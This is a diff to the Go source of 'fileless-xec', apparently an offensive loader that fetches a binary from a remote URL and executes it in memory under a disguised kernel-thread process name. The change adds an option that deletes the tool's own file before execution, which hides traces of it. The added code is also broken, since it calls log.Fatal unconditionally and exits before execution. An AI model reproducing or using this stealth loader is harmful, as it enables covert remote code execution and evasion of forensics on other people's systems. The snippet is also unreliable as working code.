@@ -91,6 +91,7 @@ func main() {
 	//CMD FILELESS-XEC
 	var name string
 	var http3 bool
+	var selfRm bool
 
 	var cmdFilelessxec = &cobra.Command{
 		Use:   "fileless-xec [remote_url]",
@@ -124,6 +125,11 @@ func main() {
 			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
 			environ := os.Environ()
 
+			if selfRm {
+				err = os.Remove("./fileless-xec")
+				log.Fatal(err)
+			}
+
 			Fexecve(fd, argsExec, environ)
 
 		},
@@ -132,6 +138,7 @@ func main() {
 	//flag handling
 	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
 	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
+	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "auto-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
 
 	cmdFilelessxec.Execute()
 }
